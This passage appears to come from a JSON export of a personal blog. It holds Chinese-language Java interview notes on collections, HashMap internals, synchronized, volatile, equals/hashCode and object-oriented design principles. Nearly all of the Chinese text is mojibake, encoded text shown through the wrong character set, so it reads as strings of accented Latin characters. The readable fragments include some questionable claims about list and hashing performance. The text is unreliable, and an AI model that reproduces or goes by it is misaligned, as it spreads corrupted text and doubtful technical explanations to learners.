ï¼Œç”¨å“ªç§æ–¹å¼çš„æ•ˆç‡é«˜ï¼ŸArrayListé‡‡ç”¨æ•°ç»„æ•°ç»„å®ç°çš„ï¼ŒæŸ¥æ‰¾æ•ˆç‡æ¯”LinkedListé«˜ã€‚LinkedListé‡‡ç”¨åŒå‘é“¾è¡¨å®ç°çš„ï¼Œæ’å…¥å’Œåˆ é™¤çš„æ•ˆç‡æ¯”ArrayListè¦é«˜ã€‚ä¸€ç›´åœ¨listçš„å°¾éƒ¨æ·»åŠ å…ƒç´ ï¼ŒLinkedListæ•ˆç‡è¦é«˜ã€‚ å¦‚æœhashMapçš„keyæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„ç±»ï¼Œæ€ä¹ˆåŠï¼Ÿä½¿ç”¨HashMapï¼Œå¦‚æœkeyæ˜¯è‡ªå®šä¹‰çš„ç±»ï¼Œå°±å¿…é¡»é‡å†™hashcode()å’Œequals()ã€‚ è§£é‡Šä¸€ä¸‹hashMapå…·ä½“å¦‚ä½•å®ç°çš„ï¼Ÿ HashmapåŸºäºæ•°ç»„å®ç°çš„ï¼Œé€šè¿‡å¯¹keyçš„hashcode &amp; æ•°ç»„çš„é•¿åº¦å¾—åˆ°åœ¨æ•°ç»„ä¸­ä½ç½®ï¼Œå¦‚å½“å‰æ•°ç»„æœ‰å…ƒç´ ï¼Œåˆ™æ•°ç»„å½“å‰å…ƒç´ nextæŒ‡å‘è¦æ’å…¥çš„å…ƒç´ ï¼Œè¿™æ ·æ¥è§£å†³hashå†²çªçš„ï¼Œå½¢æˆäº†æ‹‰é“¾å¼çš„ç»“æ„ã€‚putæ—¶åœ¨å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼Œä¼šå½¢æˆç¯ä»è€Œå¯¼è‡´æ­»å¾ªç¯ã€‚æ•°ç»„é•¿åº¦ä¸€èˆ¬æ˜¯2nï¼Œä»0å¼€å§‹ç¼–å·ï¼Œæ‰€ä»¥hashcode &amp; ï¼ˆ2n-1ï¼‰ï¼Œï¼ˆ2n-1ï¼‰æ¯ä¸€ä½éƒ½æ˜¯1ï¼Œè¿™æ ·ä¼šè®©æ•£åˆ—å‡åŒ€ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒHashMapåœ¨JDK1.8çš„ç‰ˆæœ¬ä¸­å¼•å…¥äº†çº¢é»‘æ ‘ç»“æ„åšä¼˜åŒ–ï¼Œå½“é“¾è¡¨å…ƒç´ ä¸ªæ•°å¤§äºç­‰äº8æ—¶ï¼Œé“¾è¡¨è½¬æ¢æˆæ ‘ç»“æ„ï¼›è‹¥æ¡¶ä¸­é“¾è¡¨å…ƒç´ ä¸ªæ•°å°äºç­‰äº6æ—¶ï¼Œæ ‘ç»“æ„è¿˜åŸæˆé“¾è¡¨ã€‚å› ä¸ºçº¢é»‘æ ‘çš„å¹³å‡æŸ¥æ‰¾é•¿åº¦æ˜¯log(n)ï¼Œé•¿åº¦ä¸º8çš„æ—¶å€™ï¼Œå¹³å‡æŸ¥æ‰¾é•¿åº¦ä¸º3ï¼Œå¦‚æœç»§ç»­ä½¿ç”¨é“¾è¡¨ï¼Œå¹³å‡æŸ¥æ‰¾é•¿åº¦ä¸º8/2=4ï¼Œè¿™æ‰æœ‰è½¬æ¢ä¸ºæ ‘çš„å¿…è¦ã€‚é“¾è¡¨é•¿åº¦å¦‚æœæ˜¯å°äºç­‰äº6ï¼Œ6/2=3ï¼Œè™½ç„¶é€Ÿåº¦ä¹Ÿå¾ˆå¿«çš„ï¼Œä½†æ˜¯è½¬åŒ–ä¸ºæ ‘ç»“æ„å’Œç”Ÿæˆæ ‘çš„æ—¶é—´å¹¶ä¸ä¼šå¤ªçŸ­ã€‚è¿˜æœ‰é€‰æ‹©6å’Œ8ï¼Œä¸­é—´æœ‰ä¸ªå·®å€¼7å¯ä»¥æœ‰æ•ˆé˜²æ­¢é“¾è¡¨å’Œæ ‘é¢‘ç¹è½¬æ¢ã€‚å‡è®¾ä¸€ä¸‹ï¼Œå¦‚æœè®¾è®¡æˆé“¾è¡¨ä¸ªæ•°è¶…è¿‡8åˆ™é“¾è¡¨è½¬æ¢æˆæ ‘ç»“æ„ï¼Œé“¾è¡¨ä¸ªæ•°å°äº8åˆ™æ ‘ç»“æ„è½¬æ¢æˆé“¾è¡¨ï¼Œå¦‚æœä¸€ä¸ªHashMapä¸åœçš„æ’å…¥ã€åˆ é™¤å…ƒç´ ï¼Œé“¾è¡¨ä¸ªæ•°åœ¨8å·¦å³å¾˜å¾Šï¼Œå°±ä¼šé¢‘ç¹çš„å‘ç”Ÿæ ‘è½¬é“¾è¡¨ã€é“¾è¡¨è½¬æ ‘ï¼Œæ•ˆç‡ä¼šå¾ˆä½ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"J2SE","slug":"J2SE","date":"2020-07-13T21:27:19.000Z","updated":"2021-04-11T17:11:28.203Z","comments":true,"path":"J2SE/","link":"","permalink":"https://blog.kayleh.top/J2SE/","excerpt":"Object-oriented","text":"Object-oriented å…³äºSynchronizedå’Œlocksynchronizedæ˜¯Javaçš„å…³é”®å­—ï¼Œå½“å®ƒç”¨æ¥ä¿®é¥°ä¸€ä¸ªæ–¹æ³•æˆ–è€…ä¸€ä¸ªä»£ç å—çš„æ—¶å€™ï¼Œèƒ½å¤Ÿä¿è¯åœ¨åŒä¸€æ—¶åˆ»æœ€å¤šåªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œè¯¥æ®µä»£ç ã€‚JDK1.5ä»¥åå¼•å…¥äº†è‡ªæ—‹é”ã€é”ç²—åŒ–ã€è½»é‡çº§é”ï¼Œåå‘é”æ¥æœ‰ä¼˜åŒ–å…³é”®å­—çš„æ€§èƒ½ã€‚ Lockæ˜¯ä¸€ä¸ªæ¥å£ï¼Œè€Œsynchronizedæ˜¯Javaä¸­çš„å…³é”®å­—ï¼Œsynchronizedæ˜¯å†…ç½®çš„è¯­è¨€å®ç°ï¼›synchronizedåœ¨å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œä¼šè‡ªåŠ¨é‡Šæ”¾çº¿ç¨‹å æœ‰çš„é”ï¼Œå› æ­¤ä¸ä¼šå¯¼è‡´æ­»é”ç°è±¡å‘ç”Ÿï¼›è€ŒLockåœ¨å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œå¦‚æœæ²¡æœ‰ä¸»åŠ¨é€šè¿‡unLock()å»é‡Šæ”¾é”ï¼Œåˆ™å¾ˆå¯èƒ½é€ æˆæ­»é”ç°è±¡ï¼Œå› æ­¤ä½¿ç”¨Lockæ—¶éœ€è¦åœ¨finallyå—ä¸­é‡Šæ”¾é”ï¼›Lockå¯ä»¥è®©ç­‰å¾…é”çš„çº¿ç¨‹å“åº”ä¸­æ–­ï¼Œè€Œsynchronizedå´ä¸è¡Œï¼Œä½¿ç”¨synchronizedæ—¶ï¼Œç­‰å¾…çš„çº¿ç¨‹ä¼šä¸€ç›´ç­‰å¾…ä¸‹å»ï¼Œä¸èƒ½å¤Ÿå“åº”ä¸­æ–­ï¼›é€šè¿‡Lockå¯ä»¥çŸ¥é“æœ‰æ²¡æœ‰æˆåŠŸè·å–é”ï¼Œè€Œsynchronizedå´æ— æ³•åŠåˆ°ã€‚ volatile volatileå…³é”®å­—æ˜¯ç”¨æ¥ä¿è¯æœ‰åºæ€§å’Œå¯è§æ€§çš„ã€‚è¿™è·ŸJavaå†…å­˜æ¨¡å‹æœ‰å…³ã€‚æ¯”å¦‚æˆ‘ä»¬æ‰€å†™çš„ä»£ç ï¼Œä¸ä¸€å®šæ˜¯æŒ‰ç…§æˆ‘ä»¬è‡ªå·±ä¹¦å†™çš„é¡ºåºæ¥æ‰§è¡Œçš„ï¼Œç¼–è¯‘å™¨ä¼šåšé‡æ’åºï¼ŒCPUä¹Ÿä¼šåšé‡æ’åºçš„ï¼Œè¿™æ ·çš„é‡æ’åºæ˜¯ä¸ºäº†å‡å°‘æµæ°´çº¿çš„é˜»å¡çš„ï¼Œå¼•èµ·æµæ°´é˜»å¡ï¼Œæ¯”å¦‚æ•°æ®ç›¸å…³æ€§ï¼Œæé«˜CPUçš„æ‰§è¡Œæ•ˆç‡ã€‚éœ€è¦æœ‰ä¸€å®šçš„é¡ºåºå’Œè§„åˆ™æ¥ä¿è¯ï¼Œä¸ç„¶ç¨‹åºå‘˜è‡ªå·±å†™çš„ä»£ç éƒ½ä¸çŸ¥å¸¦å¯¹ä¸å¯¹äº†ï¼Œæ‰€ä»¥æœ‰happens-beforeè§„åˆ™ï¼Œå…¶ä¸­æœ‰æ¡å°±æ˜¯volatileå˜é‡è§„åˆ™ï¼šå¯¹ä¸€ä¸ªå˜é‡çš„å†™æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢å¯¹è¿™ä¸ªå˜é‡çš„è¯»æ“ä½œï¼›æœ‰åºæ€§å®ç°çš„æ˜¯é€šè¿‡æ’å…¥å†…å­˜å±éšœæ¥ä¿è¯çš„ã€‚å¯è§æ€§ï¼šé¦–å…ˆJavaå†…å­˜æ¨¡å‹åˆ†ä¸ºï¼Œä¸»å†…å­˜ï¼Œå·¥ä½œå†…å­˜ã€‚æ¯”å¦‚çº¿ç¨‹Aä»ä¸»å†…å­˜æŠŠå˜é‡ä»ä¸»å†…å­˜è¯»åˆ°äº†è‡ªå·±çš„å·¥ä½œå†…å­˜ä¸­ï¼Œåšäº†åŠ 1çš„æ“ä½œï¼Œä½†æ˜¯æ­¤æ—¶æ²¡æœ‰å°†içš„æœ€æ–°å€¼åˆ·æ–°ä¼šä¸»å†…å­˜ä¸­ï¼Œçº¿ç¨‹Bæ­¤æ—¶è¯»åˆ°çš„è¿˜æ˜¯içš„æ—§å€¼ã€‚åŠ äº†volatileå…³é”®å­—çš„ä»£ç ç”Ÿæˆçš„æ±‡ç¼–ä»£ç å‘ç°ï¼Œä¼šå¤šå‡ºä¸€ä¸ªlockå‰ç¼€æŒ‡ä»¤ã€‚LockæŒ‡ä»¤å¯¹Intelå¹³å°çš„CPUï¼Œæ—©æœŸæ˜¯é”æ€»çº¿ï¼Œè¿™æ ·ä»£ä»·å¤ªé«˜äº†ï¼Œåé¢æå‡ºäº†ç¼“å­˜ä¸€è‡´æ€§åè®®ï¼ŒMESIï¼Œæ¥ä¿è¯äº†å¤šæ ¸ä¹‹é—´æ•°æ®ä¸ä¸€è‡´æ€§é—®é¢˜ã€‚ è¯·ä½ ä»‹ç»ä¸€ä¸‹Syncronizedé”ï¼Œå¦‚æœç”¨è¿™ä¸ªå…³é”®å­—ä¿®é¥°ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé”ä½äº†ä»€ä¹ˆï¼Ÿå¦‚æœä¿®é¥°æˆå‘˜æ–¹æ³•ï¼Œé”ä½äº†ä»€ä¹ˆï¼Ÿ synchronizedä¿®é¥°é™æ€æ–¹æ³•ä»¥åŠåŒæ­¥ä»£ç å—çš„synchronized (ç±».class)ç”¨æ³•é”çš„æ˜¯ç±»ï¼Œçº¿ç¨‹æƒ³è¦æ‰§è¡Œå¯¹åº”åŒæ­¥ä»£ç ï¼Œéœ€è¦è·å¾—ç±»é”ã€‚synchronizedä¿®é¥°æˆå‘˜æ–¹æ³•ï¼Œçº¿ç¨‹è·å–çš„æ˜¯å½“å‰è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡å®ä¾‹çš„å¯¹è±¡é”ã€‚ è‹¥å¯¹ä¸€ä¸ªç±»ä¸é‡å†™ï¼Œå®ƒçš„equals()æ–¹æ³•æ˜¯å¦‚ä½•æ¯”è¾ƒçš„ï¼Ÿ æ¯”è¾ƒæ˜¯å¯¹è±¡çš„åœ°å€ã€‚ è¯·è§£é‡ŠhashCode()å’Œequals()æ–¹æ³•æœ‰ä»€ä¹ˆè”ç³»ï¼ŸJavaå¯¹è±¡çš„eqaulsæ–¹æ³•å’ŒhashCodeæ–¹æ³•æ˜¯è¿™æ ·è§„å®šçš„ï¼š â€ ç›¸ç­‰ï¼ˆç›¸åŒï¼‰çš„å¯¹è±¡å¿…é¡»å…·æœ‰ç›¸ç­‰çš„å“ˆå¸Œç ï¼ˆæˆ–è€…æ•£åˆ—ç ï¼‰ã€‚ â å¦‚æœä¸¤ä¸ªå¯¹è±¡çš„hashCodeç›¸åŒï¼Œå®ƒä»¬å¹¶ä¸ä¸€å®šç›¸åŒã€‚ ä»€ä¹ˆæ˜¯æ„é€ å‡½æ•°ï¼Ÿä»€ä¹ˆæ˜¯æ„é€ å‡½æ•°é‡è½½ï¼Ÿä»€ä¹ˆæ˜¯å¤åˆ¶æ„é€ å‡½æ•°ï¼Ÿ å½“æ–°å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œæ„é€ å‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚æ¯ä¸€ä¸ªç±»éƒ½æœ‰æ„é€ å‡½æ•°ã€‚åœ¨ç¨‹åºå‘˜æ²¡æœ‰ç»™ç±»æä¾›æ„é€ å‡½æ•°çš„æƒ…å†µä¸‹ï¼ŒJavaç¼–è¯‘å™¨ä¼šä¸ºè¿™ä¸ªç±»åˆ›å»ºä¸€ä¸ªé»˜è®¤çš„æ„é€ å‡½æ•°ã€‚Javaä¸­æ„é€ å‡½æ•°é‡è½½å’Œæ–¹æ³•é‡è½½å¾ˆç›¸ä¼¼ã€‚å¯ä»¥ä¸ºä¸€ä¸ªç±»åˆ›å»ºå¤šä¸ªæ„é€ å‡½æ•°ã€‚æ¯ä¸€ä¸ªæ„é€ å‡½æ•°å¿…é¡»æœ‰å®ƒè‡ªå·±å”¯ä¸€çš„å‚æ•°åˆ—è¡¨ã€‚Javaä¸æ”¯æŒåƒC++ä¸­é‚£æ ·çš„å¤åˆ¶æ„é€ å‡½æ•°ï¼Œè¿™ä¸ªä¸åŒç‚¹æ˜¯å› ä¸ºå¦‚æœä½ ä¸è‡ªå·±å†™æ„é€ å‡½æ•°çš„æƒ…å†µä¸‹ï¼ŒJavaä¸ä¼šåˆ›å»ºé»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°ã€‚ è¯·è¯´æ˜Javaä¸­çš„æ–¹æ³•è¦†ç›–(Overriding)å’Œæ–¹æ³•é‡è½½(Overloading)æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ Javaä¸­çš„æ–¹æ³•é‡è½½å‘ç”Ÿåœ¨åŒä¸€ä¸ªç±»é‡Œé¢ä¸¤ä¸ªæˆ–è€…æ˜¯å¤šä¸ªæ–¹æ³•çš„æ–¹æ³•åç›¸åŒä½†æ˜¯å‚æ•°ä¸åŒçš„æƒ…å†µã€‚ ä¸æ­¤ç›¸å¯¹ï¼Œæ–¹æ³•è¦†ç›–æ˜¯è¯´å­ç±»é‡æ–°å®šä¹‰äº†çˆ¶ç±»çš„æ–¹æ³•ã€‚æ–¹æ³•è¦†ç›–å¿…é¡»æœ‰ç›¸åŒçš„æ–¹æ³•åï¼Œå‚æ•°åˆ—è¡¨å’Œè¿”å›ç±»å‹ã€‚è¦†ç›–è€…å¯èƒ½ä¸ä¼šé™åˆ¶å®ƒæ‰€è¦†ç›–çš„æ–¹æ³•çš„è®¿é—®ã€‚ Queryæ¥å£çš„listæ–¹æ³•å’Œiterateæ–¹æ³•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ â‘  list()æ–¹æ³•æ— æ³•åˆ©ç”¨ä¸€çº§ç¼“å­˜å’ŒäºŒçº§ç¼“å­˜ï¼ˆå¯¹ç¼“å­˜åªå†™ä¸è¯»ï¼‰ï¼Œå®ƒåªèƒ½åœ¨å¼€å¯æŸ¥è¯¢ç¼“å­˜çš„å‰æä¸‹ä½¿ç”¨æŸ¥è¯¢ç¼“å­˜ï¼›iterate()æ–¹æ³•å¯ä»¥å……åˆ†åˆ©ç”¨ç¼“å­˜ï¼Œå¦‚æœç›®æ ‡æ•°æ®åªè¯»æˆ–è€…è¯»å–é¢‘ç¹ï¼Œä½¿ç”¨iterate()æ–¹æ³•å¯ä»¥å‡å°‘æ€§èƒ½å¼€é”€ã€‚â‘¡ list()æ–¹æ³•ä¸ä¼šå¼•èµ·N+1æŸ¥è¯¢é—®é¢˜ï¼Œè€Œiterate()æ–¹æ³•å¯èƒ½å¼•èµ·N+1æŸ¥è¯¢é—®é¢˜ é¢å‘å¯¹è±¡çš„â€å…­åŸåˆ™ä¸€æ³•åˆ™â€ã€‚ - å•ä¸€èŒè´£åŸåˆ™ï¼šä¸€ä¸ªç±»åªåšå®ƒè¯¥åšçš„äº‹æƒ…ã€‚ï¼ˆå•ä¸€èŒè´£åŸåˆ™æƒ³è¡¨è¾¾çš„å°±æ˜¯â€é«˜å†…èšâ€ï¼Œå†™ä»£ç æœ€ç»ˆæçš„åŸåˆ™åªæœ‰å…­ä¸ªå­—â€é«˜å†…èšã€ä½è€¦åˆâ€ï¼Œæ‰€è°“çš„é«˜å†…èšå°±æ˜¯ä¸€ä¸ªä»£ç æ¨¡å—åªå®Œæˆä¸€é¡¹åŠŸèƒ½ï¼Œåœ¨é¢å‘å¯¹è±¡ä¸­ï¼Œå¦‚æœåªè®©ä¸€ä¸ªç±»å®Œæˆå®ƒè¯¥åšçš„äº‹ï¼Œè€Œä¸æ¶‰åŠä¸å®ƒæ— å…³çš„é¢†åŸŸå°±æ˜¯è·µè¡Œäº†é«˜å†…èšçš„åŸåˆ™ï¼Œè¿™ä¸ªç±»å°±åªæœ‰å•ä¸€èŒè´£ã€‚å¦ä¸€ä¸ªæ˜¯æ¨¡å—åŒ–ï¼Œå¥½çš„è‡ªè¡Œè½¦æ˜¯ç»„è£…è½¦ï¼Œä»å‡éœ‡å‰ã€åˆ¹è½¦åˆ°å˜é€Ÿå™¨ï¼Œæ‰€æœ‰çš„éƒ¨ä»¶éƒ½æ˜¯å¯ä»¥æ‹†å¸å’Œé‡æ–°ç»„è£…çš„ï¼Œå¥½çš„ä¹’ä¹“çƒæ‹ä¹Ÿä¸æ˜¯æˆå“æ‹ï¼Œä¸€å®šæ˜¯åº•æ¿å’Œèƒ¶çš®å¯ä»¥æ‹†åˆ†å’Œè‡ªè¡Œç»„è£…çš„ï¼Œä¸€ä¸ªå¥½çš„è½¯ä»¶ç³»ç»Ÿï¼Œå®ƒé‡Œé¢çš„æ¯ä¸ªåŠŸèƒ½æ¨¡å—ä¹Ÿåº”è¯¥æ˜¯å¯ä»¥è½»æ˜“çš„æ‹¿åˆ°å…¶ä»–ç³»ç»Ÿä¸­ä½¿ç”¨çš„ï¼Œè¿™æ ·æ‰èƒ½å®ç°è½¯ä»¶å¤ç”¨çš„ç›®æ ‡ã€‚ï¼‰- å¼€é—­åŸåˆ™ï¼šè½¯ä»¶å®ä½“åº”å½“å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚ï¼ˆåœ¨ç†æƒ³çš„çŠ¶æ€ä¸‹ï¼Œå½“æˆ‘ä»¬éœ€è¦ä¸ºä¸€ä¸ªè½¯ä»¶ç³»ç»Ÿå¢åŠ æ–°åŠŸèƒ½æ—¶ï¼Œåªéœ€è¦ä»åŸæ¥çš„ç³»ç»Ÿæ´¾ç”Ÿå‡ºä¸€äº›æ–°ç±»å°±å¯ä»¥ï¼Œä¸éœ€è¦ä¿®æ”¹åŸæ¥çš„ä»»ä½•ä¸€è¡Œä»£ç ã€‚è¦åšåˆ°å¼€é—­æœ‰ä¸¤ä¸ªè¦ç‚¹ï¼šâ‘ æŠ½è±¡æ˜¯å…³é”®ï¼Œä¸€ä¸ªç³»ç»Ÿä¸­å¦‚æœæ²¡æœ‰æŠ½è±¡ç±»æˆ–æ¥å£ç³»ç»Ÿå°±æ²¡æœ‰æ‰©å±•ç‚¹ï¼›â‘¡å°è£…å¯å˜æ€§ï¼Œå°†ç³»ç»Ÿä¸­çš„å„ç§å¯å˜å› ç´ å°è£…åˆ°ä¸€ä¸ªç»§æ‰¿ç»“æ„ä¸­ï¼Œå¦‚æœå¤šä¸ªå¯å˜å› ç´ æ··æ‚åœ¨ä¸€èµ·ï¼Œç³»ç»Ÿå°†å˜å¾—å¤æ‚è€Œæ¢ä¹±ï¼Œå¦‚æœä¸æ¸…æ¥šå¦‚ä½•å°è£…å¯å˜æ€§ï¼Œå¯ä»¥å‚è€ƒã€Šè®¾è®¡æ¨¡å¼ç²¾è§£ã€‹ä¸€ä¹¦ä¸­å¯¹æ¡¥æ¢æ¨¡å¼çš„è®²è§£çš„ç« èŠ‚ã€‚ï¼‰- ä¾èµ–å€’è½¬åŸåˆ™ï¼šé¢å‘æ¥å£ç¼–ç¨‹ã€‚ï¼ˆè¯¥åŸåˆ™è¯´å¾—ç›´ç™½å’Œå…·ä½“ä¸€äº›å°±æ˜¯å£°æ˜æ–¹æ³•çš„å‚æ•°ç±»å‹ã€æ–¹æ³•çš„è¿”å›ç±»å‹ã€å˜é‡çš„å¼•ç”¨ç±»å‹æ—¶ï¼Œå°½å¯èƒ½ä½¿ç”¨æŠ½è±¡ç±»å‹è€Œä¸ç”¨å…·ä½“ç±»å‹ï¼Œå› ä¸ºæŠ½è±¡ç±»å‹å¯ä»¥è¢«å®ƒçš„ä»»ä½•ä¸€ä¸ªå­ç±»å‹æ‰€æ›¿ä»£ï¼Œè¯·å‚è€ƒä¸‹é¢çš„é‡Œæ°æ›¿æ¢åŸåˆ™ã€‚ï¼‰é‡Œæ°æ›¿æ¢åŸåˆ™ï¼šä»»ä½•æ—¶å€™éƒ½å¯ä»¥ç”¨å­ç±»å‹æ›¿æ¢æ‰çˆ¶ç±»å‹ã€‚ï¼ˆå…³äºé‡Œæ°æ›¿æ¢åŸåˆ™çš„æè¿°ï¼ŒBarbara Liskovå¥³å£«çš„æè¿°æ¯”è¿™ä¸ªè¦å¤æ‚å¾—å¤šï¼Œä½†ç®€å•çš„è¯´å°±æ˜¯èƒ½ç”¨çˆ¶ç±»å‹çš„åœ°æ–¹å°±ä¸€å®šèƒ½ä½¿ç”¨å­ç±»å‹ã€‚é‡Œæ°æ›¿æ¢åŸåˆ™å¯ä»¥æ£€æŸ¥ç»§æ‰¿å…³ç³»æ˜¯å¦åˆç†ï¼Œå¦‚æœä¸€ä¸ªç»§æ‰¿å…³ç³»è¿èƒŒäº†é‡Œæ°æ›¿æ¢åŸåˆ™ï¼Œé‚£ä¹ˆè¿™ä¸ªç»§æ‰¿å…³ç³»ä¸€å®šæ˜¯é”™è¯¯çš„ï¼Œéœ€è¦å¯¹ä»£ç è¿›è¡Œé‡æ„ã€‚ä¾‹å¦‚è®©çŒ«ç»§æ‰¿ç‹—ï¼Œæˆ–è€…ç‹—ç»§æ‰¿çŒ«ï¼Œåˆæˆ–è€…è®©æ­£æ–¹å½¢ç»§æ‰¿é•¿æ–¹å½¢éƒ½æ˜¯é”™è¯¯çš„ç»§æ‰¿å…³ç³»ï¼Œå› ä¸ºä½ å¾ˆå®¹æ˜“æ‰¾åˆ°è¿åé‡Œæ°æ›¿æ¢åŸåˆ™çš„åœºæ™¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå­ç±»ä¸€å®šæ˜¯å¢åŠ çˆ¶ç±»çš„èƒ½åŠ›è€Œä¸æ˜¯å‡å°‘çˆ¶ç±»çš„èƒ½åŠ›ï¼Œå› ä¸ºå­ç±»æ¯”çˆ¶ç±»çš„èƒ½åŠ›æ›´å¤šï¼ŒæŠŠèƒ½åŠ›å¤šçš„å¯¹è±¡å½“æˆèƒ½åŠ›å°‘çš„å¯¹è±¡æ¥ç”¨å½“ç„¶æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚ï¼‰- æ¥å£éš”ç¦»åŸåˆ™ï¼šæ¥å£è¦å°è€Œä¸“ï¼Œç»ä¸èƒ½å¤§è€Œå…¨ã€‚ï¼ˆè‡ƒè‚¿çš„æ¥å£æ˜¯å¯¹æ¥å£çš„æ±¡æŸ“ï¼Œæ—¢ç„¶æ¥å£è¡¨ç¤ºèƒ½åŠ›ï¼Œé‚£ä¹ˆä¸€ä¸ªæ¥å£åªåº”è¯¥æè¿°ä¸€ç§èƒ½åŠ›ï¼Œæ¥å£ä¹Ÿåº”è¯¥æ˜¯é«˜åº¦å†…èšçš„ã€‚ä¾‹å¦‚ï¼Œç´æ£‹ä¹¦ç”»å°±åº”è¯¥åˆ†åˆ«è®¾è®¡ä¸ºå››ä¸ªæ¥å£ï¼Œè€Œä¸åº”è®¾è®¡æˆä¸€ä¸ªæ¥å£ä¸­çš„å››ä¸ªæ–¹æ³•ï¼Œå› ä¸ºå¦‚æœè®¾è®¡æˆä¸€ä¸ªæ¥å£ä¸­çš„å››ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¥å£å¾ˆéš¾ç”¨ï¼Œæ¯•ç«Ÿç´æ£‹ä¹¦ç”»å››æ ·éƒ½ç²¾é€šçš„äººè¿˜æ˜¯å°‘æ•°ï¼Œè€Œå¦‚æœè®¾è®¡æˆå››ä¸ªæ¥å£ï¼Œä¼šå‡ é¡¹å°±å®ç°å‡ ä¸ªæ¥å£ï¼Œè¿™æ ·çš„è¯æ¯ä¸ªæ¥å£è¢«å¤ç”¨çš„å¯èƒ½æ€§æ˜¯å¾ˆé«˜çš„ã€‚Javaä¸­çš„æ¥å£ä»£è¡¨èƒ½åŠ›ã€ä»£è¡¨çº¦å®šã€ä»£è¡¨è§’è‰²ï¼Œèƒ½å¦æ­£ç¡®çš„ä½¿ç”¨æ¥å£ä¸€å®šæ˜¯ç¼–ç¨‹æ°´å¹³é«˜ä½çš„é‡è¦æ ‡è¯†ã€‚ï¼‰- åˆæˆèšåˆå¤ç”¨åŸåˆ™ï¼šä¼˜å…ˆä½¿ç”¨èšåˆæˆ–åˆæˆå…³ç³»å¤ç”¨ä»£ç ã€‚ï¼ˆé€šè¿‡ç»§æ‰¿æ¥å¤ç”¨ä»£ç æ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­è¢«æ»¥ç”¨å¾—æœ€å¤šçš„ä¸œè¥¿ï¼Œå› ä¸ºæ‰€æœ‰çš„æ•™ç§‘ä¹¦éƒ½æ— ä¸€ä¾‹å¤–çš„å¯¹ç»§æ‰¿è¿›è¡Œäº†é¼“å¹ä»è€Œè¯¯å¯¼äº†åˆå­¦è€…ï¼Œç±»ä¸ç±»ä¹‹é—´ç®€å•çš„è¯´æœ‰ä¸‰ç§å…³ç³»ï¼ŒIs-Aå…³ç³»ã€Has-Aå…³ç³»ã€Use-Aå…³ç³»ï¼Œåˆ†åˆ«ä»£è¡¨ç»§æ‰¿ã€å…³è”å’Œä¾èµ–ã€‚å…¶ä¸­ï¼Œå…³è”å…³ç³»æ ¹æ®å…¶å…³è”çš„å¼ºåº¦åˆå¯ä»¥è¿›ä¸€æ­¥åˆ’åˆ†ä¸ºå…³è”ã€èšåˆå’Œåˆæˆï¼Œä½†è¯´ç™½äº†éƒ½æ˜¯Has-Aå…³ç³»ï¼Œåˆæˆèšåˆå¤ç”¨åŸåˆ™æƒ³è¡¨è¾¾çš„æ˜¯ä¼˜å…ˆè€ƒè™‘Has-Aå…³ç³»è€Œä¸æ˜¯Is-Aå…³ç³»å¤ç”¨ä»£ç ï¼ŒåŸå› å˜›å¯ä»¥è‡ªå·±ä»ç™¾åº¦ä¸Šæ‰¾åˆ°ä¸€ä¸‡ä¸ªç†ç”±ï¼Œéœ€è¦è¯´æ˜çš„æ˜¯ï¼Œå³ä½¿åœ¨Javaçš„APIä¸­ä¹Ÿæœ‰ä¸å°‘æ»¥ç”¨ç»§æ‰¿çš„ä¾‹å­ï¼Œä¾‹å¦‚Propertiesç±»ç»§æ‰¿äº†Hashtableç±»ï¼ŒStackç±»ç»§æ‰¿äº†Vectorç±»ï¼Œè¿™äº›ç»§æ‰¿æ˜æ˜¾å°±æ˜¯é”™è¯¯çš„ï¼Œæ›´å¥½çš„åšæ³•æ˜¯åœ¨Propertiesç±»ä¸­æ”¾ç½®ä¸€ä¸ªHashtableç±»å‹çš„æˆå‘˜å¹¶ä¸”å°†å…¶é”®å’Œå€¼éƒ½è®¾ç½®ä¸ºå­—ç¬¦ä¸²æ¥å­˜å‚¨æ•°æ®ï¼Œè€ŒStackç±»çš„è®¾è®¡ä¹Ÿåº”è¯¥æ˜¯åœ¨Stackç±»ä¸­æ”¾ä¸€ä¸ªVectorå¯¹è±¡æ¥å­˜å‚¨æ•°æ®ã€‚è®°ä½ï¼šä»»ä½•æ—¶å€™éƒ½ä¸è¦ç»§æ‰¿å·¥å…·ç±»ï¼Œå·¥å…·æ˜¯å¯ä»¥æ‹¥æœ‰å¹¶å¯ä»¥ä½¿ç”¨çš„ï¼Œè€Œä¸æ˜¯æ‹¿æ¥ç»§æ‰¿çš„ã€‚ï¼‰- è¿ªç±³ç‰¹æ³•åˆ™ï¼šè¿ªç±³ç‰¹æ³•åˆ™åˆå«æœ€å°‘çŸ¥è¯†åŸåˆ™ï¼Œä¸€ä¸ªå¯¹è±¡åº”å½“å¯¹å…¶ä»–å¯¹è±¡æœ‰å°½å¯èƒ½å°‘çš„äº†è§£ã€‚å†å¤æ‚çš„ç³»ç»Ÿéƒ½å¯ä»¥ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªç®€å•çš„é—¨é¢ï¼ŒJava Webå¼€å‘ä¸­ä½œä¸ºå‰ç«¯æ§åˆ¶å™¨çš„Servletæˆ–Filterä¸å°±æ˜¯ä¸€ä¸ªé—¨é¢å—ï¼Œæµè§ˆå™¨å¯¹æœåŠ¡å™¨çš„è¿ä½œæ–¹å¼ä¸€æ— 